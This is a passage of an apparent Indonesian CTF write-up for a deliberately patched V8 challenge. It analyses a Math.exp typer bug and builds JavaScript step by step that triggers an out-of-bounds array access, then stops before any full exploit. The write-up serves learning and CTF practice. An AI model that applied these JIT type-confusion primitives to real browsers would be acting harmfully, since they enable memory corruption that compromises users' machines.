---
layout: post
title: Cyber Jawara Quick Maffs
subtitle: Typer Bug v8
categories: CTF
tags: [national, writeups, v8]
---


## Introduction
> 1 + 1 = 2, e^2 that's 9? maybe? idk.\
> Author: circleous#0587

Untuk download challengenya kalian bisa download di [sini](https://google.com)<br>
Untuk referensi v8 typer bug kalian bisa lihat di [sini](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/).<br>
Hint dari author:
```js
function foo() {
  return Object.is(Math.exp(NaN), NaN);
}
```




## Setup
Didalam zip file sudah ada README.md bisa kalian baca, tapi disini saya akan jelaskan cara setup dan build untuk challengenya dari awal.
  1. Install depot_tools
  ```sh
  $ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
  $ echo "export PATH=/home/your_path/path/depot_tools:$PATH" >> ~/.bashrc
  $ source ~/.bashrc
  ```
  2. Next extract challengenya, dan dialamnya sudah ada README.md
  ```sh
  $ fetch v8 # https://chromium.googlesource.com/chromium/tools/depot_tools.git
  $ cd v8
  $ ./build/install-build-deps.sh
  $ git checkout 5fe0aa3bc79c0a9d3ad546b79211f07105f09585
  $ git apply path/to/maffs.patch # challange patch
  $ git apply path/to/v8_global.patch # disable built-in d8 global
  $ ./tools/dev/v8gen.py x64.release
  $ ninja -C ./out.gn/x64.release #Release version
  $ ./tools/dev/v8gen.py x64.debug
  $ ninja -C ./out.gn/x64.debug # Debug version
  ```

Untuk build v8 akan memakan waktu lumayan lama tergantung kecepatan koneksi kalian sama spec laptop kalian.
Untuk Debugging bisa menggunakan gdb
```sh
$ gdb -q d8
$ run --shell script.js
```
`--shell` disini agar v8 tidak langsung exit saat kita running script kita, untuk contoh script saya seperti ini
```js
function foo() {
    console.log("Hello World!\n");
}
foo();
```
![Test](/assets/images/quickmaffs/quick1.png)

**Now we are ready to HACK!**


## Patch Analysis
Sekarang kita baca patch `maffs.patch` yang ada di soal untuk yang `v8_global.patch` tidak ada yang perlu kita analisis.<br>
Kita fokus ke `maffs.patch`.

{% highlight diff linenos %}
diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
index 50a523c606..0b46267c4f 100644
--- a/src/compiler/js-create-lowering.cc
+++ b/src/compiler/js-create-lowering.cc
@@ -683,9 +683,6 @@ Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) {
         length_type.Max() <= kElementLoopUnrollLimit &&
         length_type.Min() == length_type.Max()) {
       int capacity = static_cast<int>(length_type.Max());
-      // Replace length with a constant in order to protect against a potential
-      // typer bug leading to length > capacity.
-      length = jsgraph()->Constant(capacity);
       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
                             allocation, slack_tracking_prediction);
     }
diff --git a/src/compiler/operation-typer.cc b/src/compiler/operation-typer.cc
index e7dc51bd2d..121a7a7107 100644
--- a/src/compiler/operation-typer.cc
+++ b/src/compiler/operation-typer.cc
@@ -411,7 +411,7 @@ Type OperationTyper::NumberCosh(Type type) {
 
 Type OperationTyper::NumberExp(Type type) {
   DCHECK(type.Is(Type::Number()));
-  return Type::Union(Type::PlainNumber(), Type::NaN(), zone());
+  return Type::PlainNumber();
 }
 
 Type OperationTyper::NumberExpm1(Type type) {
{% endhighlight %}

Disini saya jelasin sedikit maksud patch diatas:
  - Line 1 code tersebut patching file `src/compiler/js-create-lowring.cc` untuk code yang di patch bisa dilihat pada line 9-11 3 baris code di deleted.
  - Line selanjutnya patching file `src/compiler/operation-typer.cc` untuk code yang di patch bisa dilihat pada line 23 dan 24.

Can u guys see the bug?<br>
Sebelum patch typer set<br>
`Math.exp to be Union(Type::PlainNumber(), Type::NaN(), zone())` ini berarti output dari Math.exp adalah PlainNumber atau NaN.<br>
Nah setelah patch, kita bisa lihat pada line 24.
Typer set `Math.exp to be PlainNumber();` ini berarti output dari Math.exp akan menjadi PlainNumber.<br>
Nah dari tadi kita selalu nyebut typer typer, apa sih itu?<br>
Jadi, Modern JS engine seperti v8 melakukan kompilasi **just-in-time (JIT)** dari kode JS.<br>
Hal ini dilakukan untuk mempercepat eksekusi dari JS. Nah loh bingung, untuk lengkapnya ada di [sini](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/).
Jadi intinya v8 akan memanggil Turbofan JIT Compiler jika kita melakukan loop dalam jumlah banyak. Lets try<br>


## Trigger the Bug
Langsung saja dari hint yang diberikan kita coba dulu, seperti ini.<br>
```javascript
function foo() {
    let v = Object.is(Math.exp(NaN), NaN);
    return v;
}
console.log(foo()); //true
```
Nah karena penjelasan sebelumnya, Turbofan akan terpanggil jika kita melakukan **loop** yang banyak.<br>
```javascript
function foo() {
    let v = Object.is(Math.exp(NaN), NaN);
    return v;
}

console.log(foo()); //true
for (var i = 0; i < 100000; i++) {
	foo();
}
console.log("Result will be false now");
console.log(foo()); //false
```
See? kita berhasil trigger bug, kenapa bisa jadi false? karena saat Turbofan melakukan compiler, v8 akan melakukan
optimasi pipeline. Nah loh bingung, intinya v8 akan menjalankan source code dari `src/compiler/operation-typer.cc`
Ada perubahan pada source code tersebut saat kita melakukan patching tadi.<br>
```diff
 Type OperationTyper::NumberExp(Type type) {
   DCHECK(type.Is(Type::Number()));
-  return Type::Union(Type::PlainNumber(), Type::NaN(), zone());
+  return Type::PlainNumber();
 }
```
Yang dimana sebelumnya `Math.exp(NaN)` di Turbofan bisa menjadi **PlainNumber** atau **NaN**. <br>
Setelah patch `Math.exp(NaN)` di Turbofan akan selalu menjadi **PlainNumber**, yang seharusnya result yang benar dari `Math.exp(NaN)` adalah **NaN**.<br>
Nah gimana caranya kita ingin debug lewat TurboFan? kalian bisa build di local caranya bisa lihat di [sini](https://chromium.googlesource.com/v8/v8/+/refs/heads/lkgr/tools/turbolizer/).<br>
Atau cara lain bisa akses online lewat [sini](https://v8.github.io/tools/head/turbolizer/index.html).

Nah next kalian bisa lakukan command `./d8 exploit.js --trace-turbo`, nanti akan ada file bernama `turbo-foo-x.json`
![Quick2](/assets/images/quickmaffs/quick2.png)

Next tinggal buka website **turbolizer** CTRL+L untuk dan pilih file json kalian, jangan lupa baca info yang lain di menu sebelah kiri biar lebih paham.<br>
Tampilan awal kalian akan seperti ini.
![Quick4](/assets/images/quickmaffs/quick4.png)

Nah ikutan dah tuh sesuai tanda panah, sebenernya gak harus milih mode **TFTyper**, tapi untuk debug typer bug pada chall ini saya lebih mudah lihat dengan itu.<br>
Jangan lupa klik symbol **T** yang diatas, dan aktifkan semua node yang putih2.<br>
Cara aktifinnya bisa tekan `a` ini akan select semua nodes, selanjutnya tinggal tekan `shift+1-9`.<br>
Lalu tekan `r` untuk reload biar tampilannya jadi lebih kece anjay XD. Kurang lebih seperti ini nanti.<br>
![Quick5](/assets/images/quickmaffs/quick5.png)

Kita bisa lihat terdapat node **NumberExp** disitu dan resultnya adalah **PlainNumber** yang seharusnya result aslinya adalah **NaN**.
Selanjutnya, bagaimana kita manfaatkan bug ini hingga bisa dapat shell?.

### Proceed the Bug

Sebenarnya banyak writeup tentang v8 typer bug yang bisa kalian cari di google.<br>
Salah satunya [CVE-2020-6383](https://www.n1net4il.kr/posts/cve-2020-6383-analysis). Dari semua writeup typer bug yang ada, goals nya adalah memanfaatkan typer bug ini
agar bisa mentrigger **OOB**.<br>
Writeup diatas sedikit mirip dengan chall ini, jadi intinya kita memanfaatkan typer bug untuk membuat nilai di Turbolizer dengan nilai sesungguhnya berbeda agar bisa mentrigger **OOB**.<br>
Biar lebih kebayang contohnya seperti ini.

{% highlight javascript linenos %}
function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v >>= 1;
    return v;
}

console.log(foo());
for (var i = 0; i < 100000; i++) {
	foo();
}
console.log(foo()); //0
{% endhighlight %}

Jalankan dengan `--trace-turbo` lalu buka di turbolizer. Hasilnya seperti ini
![Quick6](/assets/images/quickmaffs/quick6.png)
Kita bisa lihat pada gambar diatas, saat nilai `v` yang awalnya `NaN` lalu kita shift left sekali `v >>= 1`,
Result di Turbolizer menunjukkan `Range(-1073741824, 1073741823)` yang artinya result `v >>= 1` bisa bernilai `-1073741824 s/d 1073741823`,
dan result yang sebenarnya muncul adalah `0`.<br>
Nah karena `0` masih termasuk dari range `-1073741824 - 1073741823`, artinya kita belum berhasil menipu si Turbolizernya.<br>
Nah bagaimana caranya? agar nilai yang sesungguhnya itu berbeda dengan dengan nilai dari Turbolizer?<br>

Hasil dari `Math.exp(NaN)` adalah `PlainNumber` yang artinya bisa bernilai `Range(-Inf, Inf)`, namun saat kita shift left sekali,
Hasilnya adalah `Range(-1073741824, 1073741823)`.<br>
Maka kita bisa beri asumsi nilai `Math.exp(NaN)`,<br>
saat bug telah di trigger adalah `Range(-2147483648, 2147483647)`. Ini hanya asumsi sementara, goals kita adalah membuat nilai di Turbolizer itu kecil
sedangkan nilai yang sebenarnya (nilai yang muncul saat di print) itu besar, sehingga saat kita bisa mentrigger OOB.<br>
Oke coba kita lihat source dari `src/compiler/operation-typer.cc` untuk melihat apakah ada fungsi `Math` yang bisa kita gunakan.<br>
Disini saya menemukan fungsi `NumberSign()` atau di JS itu `Math.sign()`.
```js
Type OperationTyper::NumberSign(Type type) {
  DCHECK(type.Is(Type::Number()));
  if (type.Is(cache_->kZeroish)) return type;
  bool maybe_minuszero = type.Maybe(Type::MinusZero());
  bool maybe_nan = type.Maybe(Type::NaN());
  type = Type::Intersect(type, Type::PlainNumber(), zone());
  if (type.IsNone()) {
    // Do nothing.
  } else if (type.Max() < 0.0) {
    type = cache_->kSingletonMinusOne;
  } else if (type.Max() <= 0.0) {
    type = cache_->kMinusOneOrZero;
  } else if (type.Min() > 0.0) {
    type = cache_->kSingletonOne;
  } else if (type.Min() >= 0.0) {
    type = cache_->kZeroOrOne;
  } else {
    type = Type::Range(-1.0, 1.0, zone());
  }
  if (maybe_minuszero) type = Type::Union(type, Type::MinusZero(), zone());
  if (maybe_nan) type = Type::Union(type, Type::NaN(), zone());
  DCHECK(!type.IsNone());
  return type;
}
```
Jika kita lihat pada source code dari `Math.sign` diatas, hasil type dari `Math.exp(NaN)` adalah `PlainNumber`. Nah source code diatas akan melakukan check pada
`type.Max() & type.Min()` dan hasil type dari `Math.exp(NaN)` tidak memenuhi itu semua sehingga saat kita lakukan
```js
v = Math.exp(NaN);
v = Math.sign(v);
```
`v` akan bernilai `Range(-1.0, 1.0)` pada turbolizer, untuk dokumentasi bisa lihat di [SINI](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/sign).
```js
Math.sign(3);     //  1
Math.sign(-3);    // -1
Math.sign('-3');  // -1
Math.sign(0);     //  0
Math.sign(-0);    // -0
Math.sign(NaN);   // NaN
Math.sign('foo'); // NaN
Math.sign();      // NaN
```
Alright, saat nya kita coba kepada script kita, lalu coba kita debug pada turbolizer.
```js
function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);
    v = Math.sign(v);
    return v;
}
console.log(foo()); //true
for (var i = 0; i < 100000; i++) {
	foo();
}
console.log(foo()); //-2147483648
```
Hasilnya seperti ini.
![Quick7](/assets/images/quickmaffs/quick7.png)
Boom! saat `Number.sign(v)` nilai di turbolizer adalah `Range(-1, 1)` sedangkan nilai saat di print adalah `-2147483648`.<br>
Dengan ini kita sudah setengah jalan, selanjutnya kita bisa ikuti [CVE-2020-6383](https://www.n1net4il.kr/posts/cve-2020-6383-analysis) 
agar `Range()` di Turbolizer sama nilainya dengan writeup itu.<br>

Maka Script kita seperti ini
```js
function foo() {
    let a = {x: Infinity};
    let v = Math.exp(Infinity-a.x);	//PlainNumber
    v = Math.sign(v);			//Range(-1, 1)
    v = Math.abs(v);			//Range(0, 1) 	| Real = -2147483648
    v += 2;				//Range(2, 3) 	| Real = -2147483646
    v >>= 1;				//Range(1, 1) 	| Real = -1073741823
    v += 10;				//Range(11, 11) | Real = -1073741813
    var arr = new Array(v);	//Array(11)	| Real = -1073741813
    arr[0] = 1.1;
    return arr;
}

console.log(foo()); //true
for (var i = 0; i < 100000; i++) {
	foo();
}
var arr = foo();
console.log(arr[12]);
```
![Quick8](/assets/images/quickmaffs/quick8.png)
BOOM OOB TRIGGER
Saat kita membuat Array, size array yang terbuat di Turbolizer adalah `11`, namun karena nilai sesungguhnya itu `-1073741813`, maka OOB berahsil kita Trigger.


### OOB
Lanjut besok cape :(